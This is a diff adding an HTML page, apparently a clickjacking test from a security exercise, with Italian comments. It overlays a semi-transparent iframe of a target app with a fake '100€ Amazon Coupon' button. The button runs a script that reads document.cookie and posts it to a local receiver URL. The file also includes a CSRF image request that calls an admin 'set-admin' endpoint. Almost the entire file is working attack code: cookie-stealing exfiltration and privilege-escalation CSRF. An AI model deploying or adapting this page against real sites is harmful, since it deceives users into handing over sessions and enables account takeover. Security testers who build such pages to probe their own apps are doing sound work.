@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Clickjacking Test</title>
+    <style>
+        body {
+            padding: 0;
+            margin:0;
+        }
+        iframe {
+            width: 100vw;
+            height: 100vh;
+            opacity: 0.7;
+            position: absolute;
+            /* top: 50px;
+            left: 50px; */
+            z-index: 10;
+        }
+
+        #cover {
+            width: 100vw;
+            height: 100vh;
+            /* background: rgba(255, 255, 255, 0.5); Uno strato semi-trasparente sopra l'iframe */
+            position: absolute;
+            
+            z-index: 20;
+        }
+
+        button {
+            position: absolute;
+            top: 40vh;
+            right: 40vw;
+            z-index: 30;
+            padding: 10px;
+            background-color: yellow;
+            border-radius: 20px;
+            height: 100px;
+            width: 300px;
+            animation: pulse 1.5s infinite;
+
+        }
+        @keyframes pulse {
+            0% {
+                transform: scale(1);
+                box-shadow: 0 0 5px rgba(0, 123, 255, 0.6);
+            }
+            50% {
+                transform: scale(1.1);
+                box-shadow: 0 0 20px rgba(0, 123, 255, 0.6);
+            }
+            100% {
+                transform: scale(1);
+                box-shadow: 0 0 5px rgba(0, 123, 255, 0.6);
+            }
+        }
+    </style>
+    <script>
+        function sendCookies() {
+            // Recupera i cookie
+            const cookies = document.cookie;
+
+            // Crea un oggetto XMLHttpRequest
+            const xhr = new XMLHttpRequest();
+            const url = 'http://localhost:8001/clickjacking/receive-cookie.php';
+
+            // Apri una connessione
+            xhr.open('POST', url, true);
+            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+
+            // Invia la richiesta con i cookie
+            xhr.send('cookies=' + encodeURIComponent(cookies));
+            // Notifica l'utente
+            alert('Cookies sent!');
+        }
+
+        function sendCsrfRequest() {
+            var img = new Image();
+            img.src = "http://localhost:8000/admin/4/set-admin";
+        }
+    </script>
+</head>
+<body>
+    <!-- <h1>Clickjacking Test Page</h1>
+    <p>Questa pagina include un iframe con la tua applicazione.</p> -->
+
+    <!-- Iframe che carica la tua applicazione -->
+    <iframe src="http://internal.user:8000/articles/create"></iframe>
+
+    <!-- Uno strato semi-trasparente sopra l'iframe -->
+    <div id="cover"></div>
+
+    <!-- Un pulsante sopra l'iframe -->
+    <button onclick="sendCookies()"><b>100€ Amazon Coupon</b></button>
+</body>
+</html>
